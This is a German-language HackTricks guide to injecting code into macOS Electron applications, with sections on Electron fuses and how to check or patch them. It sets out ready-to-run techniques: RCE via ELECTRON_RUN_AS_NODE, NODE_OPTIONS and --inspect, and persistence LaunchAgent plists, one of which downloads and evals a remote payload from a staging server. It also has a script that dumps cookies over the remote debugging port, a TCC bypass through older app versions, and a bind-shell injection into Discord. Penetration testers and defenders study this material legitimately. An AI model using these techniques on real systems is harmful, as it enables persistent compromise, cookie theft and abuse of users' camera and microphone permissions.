# macOS Electron-Anwendungen Injektion

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

## Grundlegende Informationen

Wenn Sie nicht wissen, was Electron ist, finden Sie [**hier viele Informationen**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Aber vorerst wissen Sie einfach, dass Electron **node** ausführt.\
Und node hat einige **Parameter** und **Umgebungsvariablen**, die verwendet werden können, um **anderen Code auszuführen**, der nicht in der angegebenen Datei enthalten ist.

### Electron-Fuses

Diese Techniken werden im Folgenden diskutiert, aber in letzter Zeit hat Electron mehrere **Sicherheitsflags hinzugefügt, um sie zu verhindern**. Dies sind die [**Electron-Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), die verwendet werden, um zu verhindern, dass Electron-Apps in macOS **beliebigen Code laden**:

* **`RunAsNode`**: Wenn deaktiviert, verhindert es die Verwendung der Umgebungsvariable **`ELECTRON_RUN_AS_NODE`**, um Code einzufügen.
* **`EnableNodeCliInspectArguments`**: Wenn deaktiviert, werden Parameter wie `--inspect`, `--inspect-brk` nicht berücksichtigt. Dadurch wird verhindert, dass Code eingefügt wird.
* **`EnableEmbeddedAsarIntegrityValidation`**: Wenn aktiviert, wird die geladene **`asar`**-**Datei** von macOS **validiert**. Dadurch wird das Einfügen von Code verhindert, indem der Inhalt dieser Datei geändert wird.
* **`OnlyLoadAppFromAsar`**: Wenn dies aktiviert ist, wird anstelle der Suche in der folgenden Reihenfolge: **`app.asar`**, **`app`** und schließlich **`default_app.asar`**, nur app.asar überprüft und verwendet. Dadurch wird sichergestellt, dass bei Verwendung der **`embeddedAsarIntegrityValidation`**-Fuse kein nicht validierter Code geladen werden kann.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Wenn aktiviert, verwendet der Browserprozess die Datei `browser_v8_context_snapshot.bin` für seinen V8-Snapshot.

Eine weitere interessante Fuse, die das Einfügen von Code nicht verhindert, ist:

* **EnableCookieEncryption**: Wenn aktiviert, wird der Cookie-Speicher auf der Festplatte mit kryptografischen Schlüsseln auf OS-Ebene verschlüsselt.

### Überprüfen der Electron-Fuses

Sie können diese Flags von einer Anwendung aus **überprüfen** mit:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifizieren von Electron-Fuses

Wie in den [**Dokumenten erwähnt**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), werden die Konfigurationen der **Electron-Fuses** innerhalb der **Electron-Binärdatei** festgelegt, die irgendwo den String **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** enthält.

In macOS-Anwendungen befindet sich dies normalerweise in `Anwendung.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Sie können diese Datei in [https://hexed.it/](https://hexed.it/) laden und nach dem vorherigen String suchen. Nach diesem String können Sie im ASCII-Code eine Zahl "0" oder "1" sehen, die anzeigt, ob jede Sicherung deaktiviert oder aktiviert ist. Ändern Sie einfach den Hex-Code (`0x30` ist `0` und `0x31` ist `1`), um die Werte der Sicherungen zu ändern.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Beachten Sie, dass, wenn Sie versuchen, die **`Electron Framework`-Binärdatei** in einer Anwendung mit diesen geänderten Bytes zu überschreiben, die App nicht ausgeführt wird.

## RCE Hinzufügen von Code zu Electron-Anwendungen

Es können **externe JS/HTML-Dateien** vorhanden sein, die von einer Electron-App verwendet werden. Ein Angreifer könnte also Code in diese Dateien injizieren, dessen Signatur nicht überprüft wird, und beliebigen Code im Kontext der App ausführen.

{% hint style="danger" %}
Es gibt jedoch derzeit 2 Einschränkungen:

* Die Berechtigung **`kTCCServiceSystemPolicyAppBundles`** ist erforderlich, um eine App zu ändern. Standardmäßig ist dies nicht mehr möglich.
* Die kompilierte **`asap`**-Datei hat normalerweise die Sicherungen **`embeddedAsarIntegrityValidation`** und **`onlyLoadAppFromAsar`** aktiviert.

Dies macht diesen Angriffsweg komplizierter (oder unmöglich).
{% endhint %}

Beachten Sie, dass es möglich ist, die Anforderung von **`kTCCServiceSystemPolicyAppBundles`** zu umgehen, indem Sie die Anwendung in ein anderes Verzeichnis (wie **`/tmp`**) kopieren, den Ordner **`app.app/Contents`** in **`app.app/NotCon`** umbenennen, die **asar**-Datei mit Ihrem **bösartigen** Code ändern, sie wieder in **`app.app/Contents`** umbenennen und ausführen.

Sie können den Code aus der asar-Datei mit entpacken:
```bash
npx asar extract app.asar app-decomp
```
Und packen Sie es nach der Modifikation wieder zusammen mit:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE mit `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Gemäß [**der Dokumentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node) wird, wenn diese Umgebungsvariable gesetzt ist, der Prozess als normaler Node.js-Prozess gestartet.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Wenn die Fuse **`RunAsNode`** deaktiviert ist, wird die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ignoriert und dies funktioniert nicht.
{% endhint %}

### Injektion aus der App Plist

Wie [**hier vorgeschlagen**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/) könnten Sie diese Umgebungsvariable in einer Plist missbrauchen, um die Persistenz aufrechtzuerhalten:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE mit `NODE_OPTIONS`

Sie können die Payload in einer anderen Datei speichern und ausführen:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Wenn die Fuse **`EnableNodeOptionsEnvironmentVariable`** deaktiviert ist, ignoriert die App die Umgebungsvariable **NODE\_OPTIONS** beim Start, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls ignoriert wird, wenn die Fuse **`RunAsNode`** deaktiviert ist.

Wenn Sie **`ELECTRON_RUN_AS_NODE`** nicht setzen, erhalten Sie den Fehler: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Injektion aus der App Plist

Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um die Persistenz beizubehalten, indem Sie diese Schlüssel hinzufügen:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE durch Inspektion

Laut [**diesem**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) Artikel, wenn Sie eine Electron-Anwendung mit Flaggen wie **`--inspect`**, **`--inspect-brk`** und **`--remote-debugging-port`** ausführen, wird ein **Debug-Port geöffnet**, auf den Sie zugreifen können (zum Beispiel von Chrome aus über `chrome://inspect`), und Sie können Code darauf **injizieren** oder sogar neue Prozesse starten.\
Zum Beispiel:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Wenn die Fuse **`EnableNodeCliInspectArguments`** deaktiviert ist, ignoriert die App Node-Parameter (wie `--inspect`), wenn sie gestartet wird, es sei denn, die Umgebungsvariable **`ELECTRON_RUN_AS_NODE`** ist gesetzt, die ebenfalls ignoriert wird, wenn die Fuse **`RunAsNode`** deaktiviert ist.

Sie können jedoch immer noch den Electron-Parameter `--remote-debugging-port=9229` verwenden, aber die vorherige Payload funktioniert nicht, um andere Prozesse auszuführen.
{% endhint %}

Mit dem Parameter **`--remote-debugging-port=9222`** ist es möglich, einige Informationen aus der Electron-App zu stehlen, wie z.B. die **History** (mit GET-Befehlen) oder die **Cookies** des Browsers (da sie im Browser entschlüsselt werden und es einen **JSON-Endpunkt** gibt, der sie liefert).

Sie können lernen, wie das [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) und [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) gemacht wird und das automatische Tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) oder ein einfaches Skript wie:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**diesem Blogpost**](https://hackerone.com/reports/1274695) wird dieses Debugging missbraucht, um einen headless Chrome **beliebige Dateien an beliebigen Orten herunterladen zu lassen**.

### Injektion aus der App Plist

Sie könnten diese Umgebungsvariable in einer Plist missbrauchen, um die Persistenz zu erhalten, indem Sie diese Schlüssel hinzufügen:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC-Bypass durch Ausnutzung älterer Versionen

{% hint style="success" %}
Der TCC-Daemon von macOS überprüft nicht die ausgeführte Version der Anwendung. Wenn Sie also mit keiner der zuvor genannten Techniken Code in eine Electron-Anwendung injizieren können, können Sie eine frühere Version der APP herunterladen und Code darauf injizieren, da sie immer noch die TCC-Berechtigungen erhält (sofern der Trust Cache dies nicht verhindert).
{% endhint %}

## Ausführung von nicht-JS-Code

Die zuvor genannten Techniken ermöglichen es Ihnen, **JS-Code im Prozess der Electron-Anwendung auszuführen**. Beachten Sie jedoch, dass die **Kindprozesse unter demselben Sandbox-Profil** wie die Elternanwendung ausgeführt werden und **deren TCC-Berechtigungen erben**.\
Daher können Sie, wenn Sie beispielsweise Berechtigungen missbrauchen möchten, um auf Kamera oder Mikrofon zuzugreifen, einfach **eine andere Binärdatei aus dem Prozess heraus ausführen**.

## Automatische Injektion

Das Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kann leicht verwendet werden, um **anfällige Electron-Anwendungen** zu finden, die installiert sind, und Code in sie einzufügen. Dieses Tool versucht, die Technik **`--inspect`** zu verwenden:

Sie müssen es selbst kompilieren und können es wie folgt verwenden:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referenzen

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
